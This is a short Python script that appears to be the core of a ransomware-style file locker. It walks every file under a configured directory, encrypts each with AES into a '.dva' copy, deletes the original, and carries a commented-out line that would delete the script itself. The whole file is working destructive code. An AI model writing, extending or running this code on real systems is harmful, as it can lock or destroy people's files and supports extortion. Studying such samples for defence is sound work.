# -*- coding: utf-8 -*-

import pyAesCrypt
import os
import sys
import manager as mg

def encryption(file, password):
    buffer_size = 512 * 1024
    pyAesCrypt.encryptFile(
        str(file),
        str(file) + ".dva",
        password,
        buffer_size
    )
    print("[FILE '" + str(os.path.splitext(file)[0]) + "' WAS SUCCESSFULLY ENCRYPTED!]")
    os.remove(file)

def walking_by_dirs(dir, password):
    for name in os.listdir(dir):
        path = os.path.join(dir, name)
        if os.path.isfile(path):
            try:
                encryption(path, password)
            except Exception as ex:
                print(ex)
        else:
            walking_by_dirs(path, password)

password = input("Enter password for ENCRYPTION: ")
walking_by_dirs(mg.PATH_DIR, password)
# os.remove(str(sys.argv[0]))
